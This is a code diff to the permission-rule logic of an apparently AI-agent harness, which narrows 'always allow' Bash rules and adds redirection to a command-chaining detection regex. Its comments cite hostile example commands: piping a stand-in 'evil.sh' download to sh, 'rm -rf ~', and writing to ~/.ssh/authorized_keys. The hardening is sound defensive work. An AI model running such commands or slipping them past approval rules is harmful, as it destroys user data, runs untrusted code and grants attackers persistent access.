@@ -65,12 +65,38 @@ export function removeRule(project: string, rule: string): void {
   atomicWrite(rulesFile(), JSON.stringify(all, null, 2));
 }
 
-// The specifier for a rule derived from a tool call: the command (grouped by
-// its first two tokens) for Bash, the bare tool name otherwise — what an
-// "always allow" persists and later matches against.
+// Leading "VAR=value" environment assignments (PORT=3100 bun run dev) don't
+// name the command — skip them when picking what to group the rule by.
+const ENV_ASSIGN = /^[A-Za-z_][A-Za-z0-9_]*=/;
+// The specifier for a rule derived from a tool call: for Bash, the command
+// name plus its second raw token (if any); the bare tool name for everything
+// else. The second token is folded in unconditionally — NOT only when it
+// looks like a subcommand word (letters/dashes). Gating on that ("git log"
+// folds, "-rf" or "/path" doesn't) sounds like it only affects generalization,
+// but it means any command invoked with a flag, path, or quoted argument as
+// its second token — i.e. almost every real invocation — collapses to a bare
+// "Bash(<cmd>:*)" rule with NO argument constraint at all: approving a single
+// scoped `rm -rf ./node_modules/.cache` would silently persist a rule that
+// also matches `rm -rf ~`. Folding the raw second token always, like the
+// pre-existing on-disk rule format, keeps the rule scoped to what was
+// actually approved; it's narrower and "always allow" won't stick across
+// differently-argued invocations, but that's the correct tradeoff.
 export function ruleFor(toolName: string, input: Record<string, unknown>): string {
   if (toolName === "Bash" && typeof input.command === "string") {
-    const head = input.command.trim().split(/\s+/).filter(Boolean).slice(0, 2).join(" ");
+    const tokens = input.command.trim().split(/\s+/).filter(Boolean);
+    let i = 0;
+    while (i < tokens.length && ENV_ASSIGN.test(tokens[i])) i++;
+    const rest = tokens.slice(i);
+    if (rest.length === 0) {
+      // Empty command, or nothing but env assignments — there's no command
+      // name to group by. A bare "Bash" rule would allow ANY command, so
+      // fall back to the old exact-two-token grouping instead: narrow, but
+      // safe.
+      const head = tokens.slice(0, 2).join(" ");
+      return `Bash(${head}:*)`;
+    }
+    const [name, second] = rest;
+    const head = second ? `${name} ${second}` : name;
     return `Bash(${head}:*)`;
   }
   return toolName;
@@ -85,11 +111,15 @@ function parseRule(rule: string): { tool: string; spec: string | null } | null {
   return { tool: rule.slice(0, open), spec: rule.slice(open + 1, -1) };
 }
 
-// Shell separators/substitution that chain a second command onto the first:
-// ; & | ` newline and $( ). A prefix rule like "bun test:*" must never match
-// across one of these — otherwise "bun test && curl evil.sh | sh" would be
-// silently authorized by an "always allow" the user gave for "bun test".
-const SHELL_CHAIN = /[;&|`\n]|\$\(/;
+// Shell separators/substitution/redirection that chain or divert a second
+// command/target onto the first: ; & | ` newline, $( ), and < > (which also
+// covers << heredocs and <( )/>( ) process substitution). A prefix rule like
+// "bun test:*" must never match across one of these — otherwise "bun test &&
+// curl evil.sh | sh" would be silently authorized by an "always allow" the
+// user gave for "bun test". Redirection is included because a per-command
+// rule like "Bash(cat:*)" would otherwise let `cat file > ~/.ssh/authorized_keys`
+// through unprompted — no chain keyword needed, just an output target.
+const SHELL_CHAIN = /[;&|`\n<>]|\$\(/;
 
 // Prefix match at a token boundary: "bun test" matches "bun test x" but not
 // "bun tester", and never matches a command that chains on a second command
